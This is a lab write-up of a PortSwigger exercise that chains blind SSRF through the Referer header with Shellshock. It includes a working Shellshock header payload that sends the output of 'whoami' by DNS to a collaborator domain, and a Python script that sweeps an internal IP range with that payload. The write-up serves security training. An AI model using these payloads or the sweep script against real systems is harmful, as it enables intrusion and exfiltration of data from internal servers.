# Blind SSRF with Shellshock exploitation

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation), you'll learn: Blind SSRF with Shellshock exploitation! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185609.png)

In here, we can view other products' details:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185632.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185651.png)

In `/product`, it has a `Referer` header, which can be tested for ***blind SSRF***.

**To do so, I'll:**

- Go to Burp Suite's Collaborator, and copy the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185754.png)

- Add that payload in the `Referer` header, and send the request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185851.png)

- Go back to Burp Suite's Collaborator, click "Pull now" to confirm the blind SSRF vulnerability:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301185924.png)

As you can see, we received 2 DNS lookups, which means **the web application is indeed vulnerable to blind SSRF via the `Referer` header!**

Simply identifying a blind [SSRF vulnerability](https://portswigger.net/web-security/ssrf) that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. Since you cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.

### Sweep internal IP address & Shellshock exploitation

Now, we can try to test the internal services are vulnerable to Shellshock or not.

> Shellshock is effectively a Remote Command Execution (RCE) vulnerability in BASH. The vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable. (From [OWASP Shellshock Vulnerability PDF](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf))

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301190730.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301190739.png)

Armed with above information, we can the following payload to try to **exploit Shellshock via blind SSRF in `Referer` and `User-Agent` header**:

**`User-Agent` header:**
```bash
() { :; }; /usr/bin/nslookup $(whoami).vbal3wg7zfqmnb0l7sp8wngzvq1ip9dy.oastify.com/
```

This payload will run OS command `nslookup` to query the Burp Collaborator's domain, with the `whoami` command's output appended to the subdomain.

**`Referer` header:**
```
http://192.168.0.x:8080
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301191755.png)

If we got a hit in Burp Suite's Collaborator, we confirm there's a internal service that's vulnerable to Shellshock.

**Now, I'll write a Python script to sweep all the internal services ranging from `192.168.0.1` to `192.168.0.254`:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

class Exploit:
    def __init__(self, URL):
        self.URL = URL

    def sendPayload(self, ShellshockPayload, internalIPAddress):
        header = {
            'User-Agent': ShellshockPayload,
            'Referer': internalIPAddress
        }

        requests.get(self.URL, headers=header)

def main():
    URL = 'https://0a59001003ff1aa3c1a521b300450093.web-security-academy.net/product?productId=1'
    exploit = Exploit(URL)

    print('[+] Sending Shellshock payload...')
    ShellshockPayload = "() { :; }; /usr/bin/nslookup $(whoami).547vw69hspjwgltv02iipx99o0utij68.oastify.com"
    print(f'[+] Payload: {ShellshockPayload}')
    for lastOctet in range(1, 255):
        internalIPAddress = f'http://192.168.0.{lastOctet}:8080'
        print(f'[*] Trying IP: {internalIPAddress}', end='\r')

        thread = Thread(target=exploit.sendPayload, args=(ShellshockPayload, internalIPAddress))
        thread.start()
        sleep(0.1)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/Portswigger-Labs/Server-Side-Request-Forgery)-[2023.03.01|19:36:48(HKT)]
└> python3 blind_ssrf_shellshock.py
[+] Sending Shellshock payload...
[+] Payload: () { :; }; /usr/bin/nslookup $(whoami).547vw69hspjwgltv02iipx99o0utij68.oastify.com
```

**Burp Suite's Collaborator:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301193844.png)

Nice! We have 2 DNS lookups, and successfully exfiltrated the OS username!!

Let's submit that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301193912.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-7/images/Pasted%20image%2020230301193921.png)

# What we've learned:

1. Blind SSRF with Shellshock exploitation